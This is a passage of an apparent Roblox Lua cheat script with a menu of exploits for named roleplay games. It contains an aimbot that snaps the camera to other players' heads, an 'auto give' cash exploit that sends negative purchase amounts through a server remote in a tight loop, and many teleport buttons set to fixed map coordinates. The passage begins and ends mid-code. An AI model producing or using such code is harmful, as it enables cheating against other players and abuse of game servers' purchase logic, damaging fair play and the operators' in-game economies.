-- Smoothness Input
local smoothLabel = Instance.new("TextLabel")
smoothLabel.Text = "Smoothness:"
smoothLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
smoothLabel.Size = UDim2.new(0, 120, 0, 25)
smoothLabel.Position = UDim2.new(0, 10, 0, 45)
smoothLabel.BackgroundTransparency = 1
smoothLabel.Font = Enum.Font.Gotham
smoothLabel.TextSize = 14
smoothLabel.Parent = settingsFrame

local smoothBox = Instance.new("TextBox")
smoothBox.Size = UDim2.new(0, 160, 0, 25)
smoothBox.Position = UDim2.new(0, 140, 0, 45)
smoothBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
smoothBox.TextColor3 = Color3.fromRGB(255, 255, 255)
smoothBox.PlaceholderText = tostring(Smoothness)
smoothBox.Font = Enum.Font.Code
smoothBox.TextSize = 14
smoothBox.Parent = settingsFrame

local smoothCorner = Instance.new("UICorner")
smoothCorner.CornerRadius = UDim.new(0, 8)
smoothCorner.Parent = smoothBox

-- Update Smoothness on Input
smoothBox.FocusLost:Connect(function(enterPressed)
	local val = tonumber(smoothBox.Text)
	if val and val > 0 then
		Smoothness = math.clamp(val, 0.01, 1)
	end
end)

-- STATUS LABEL
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 35)
statusLabel.Position = UDim2.new(0, 10, 1, -45)
statusLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.Text = "Aimbot: OFF | FOV: " .. CurrentFOV
statusLabel.Font = Enum.Font.Code
statusLabel.TextSize = 16
statusLabel.Parent = mainFrame

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 8)
statusCorner.Parent = statusLabel

-- CROSSHAIR BUTTONS
local function createCrosshairButton(data)
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, -8, 0.75, -8)
    img.Position = UDim2.new(0, 4, 0, 4)
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. tostring(data.id)
    img.ImageColor3 = Color3.fromRGB(255, 255, 255)
    img.Parent = frame

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.25, 0)
    nameLabel.Position = UDim2.new(0, 0, 0.75, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = data.name
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextSize = 13
    nameLabel.Parent = frame

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = ""
    button.Parent = frame

    button.MouseButton1Click:Connect(function()
        CurrentCrosshair = data
        CurrentFOV = BaseFOV * data.fovMult
        crosshair.Image = "rbxassetid://" .. tostring(data.id)
        statusLabel.Text = "Aimbot: " .. (AimEnabled and "ON" or "OFF") .. " | FOV: " .. math.floor(CurrentFOV * 10) / 10
    end)

    frame.Parent = scrollFrame
end

for _, data in ipairs(Crosshairs) do
	createCrosshairButton(data)
end

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
end)

--// AIMBOT LOGIC
local function getTargetPart(character)
	return character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
end

local function getClosestPlayer()
	local closest, shortest = nil, math.huge
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil end
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character then
			local part = getTargetPart(p.Character)
			local hum = p.Character:FindFirstChildOfClass("Humanoid")
			if part and hum and hum.Health > 0 then
				local pos, visible = Camera:WorldToScreenPoint(part.Position)
				if visible then
					local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
					if dist < CurrentFOV * 20 and dist < shortest then
						closest, shortest = part.Position, dist
					end
				end
			end
		end
	end
	return closest
end

local function aimAtTarget()
	local t = getClosestPlayer()
	if t then
		if AimbotMode == "Instant" then
			Camera.CFrame = CFrame.new(Camera.CFrame.Position, t)
		else
			Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, t), Smoothness)
		end
	end
end

-- RIGHT-CLICK TOGGLE AIMBOT
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = true
		statusLabel.Text = "Aimbot: ON | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

UserInputService.InputEnded:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = false
		statusLabel.Text = "Aimbot: OFF | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

RunService.RenderStepped:Connect(function()
	if AimEnabled then
		aimAtTarget()
	end
end)

-- TOGGLE MENU (INSERT)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.Insert then
		mainFrame.Visible = not mainFrame.Visible
	end
end)

print("ILOVEYOU MONSY !")
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO CITY [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "Bagong Baryo City"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "Pen Gun", "AK-47", "AmmoBox"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(10)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("PERSONAL SANTINO SCRIPT [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "PERSONAL SANTINO SCRIPT"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "Pen Gun", "Unknown", "Unknown"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["ROLEPLAY TP"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------DOMINION-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1277.2003173828125, 3.3827743530273438, -1826.16162109375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-790.076416015625, 3.355360984802246, 544.596923828125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-662.8965454101562, 3.3553061485290527, -1483.33349609375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-428.618896484375, 6.015244483947754, -689.5989379882812)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR DEALER [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-275.1256103515625, 3.2432126998901367, -690.48095703125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PHARMACY [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-916.824951171875, 3.3557791709899902, -2051.001708984375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FLEECA [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-921.0623779296875, 3.446157932281494, -168.2418212890625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1821.7645263671875, 13.095586776733398, 286.4205627441406)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("7 ELEVEN [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-497.5661315917969, 3.3553056716918945, -1345.2403564453125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE MAIN DOOR [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-387.3024597167969, 44.56536102294922, 1706.3074951171875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE 1ST POINT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-273.4755554199219, 44.55963134765625, 1818.7889404296875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE 2ND POINT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-495.6800231933594, 44.55963134765625, 1875.9793701171875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------KALYE ONSE-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1428.125732421875, 40.41292190551758, -32.600135803222656)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1444.3717041015625, 40.38081741333008, 272.0224304199219)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1259.54150390625, 40.65171432495117, 167.2851104736328)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1127.585693359375, 40.649776458740234, -145.60560607910156)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1040.086669921875, 43.81657791137695, -441.8215637207031)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(943.53857421875, 40.49576187133789, -20.645029067993164)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("COURT [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1110.2763671875, 40.592098236083984, 100.20720672607422)

-- Function to teleport the player immediately
local function teleportToTarget()
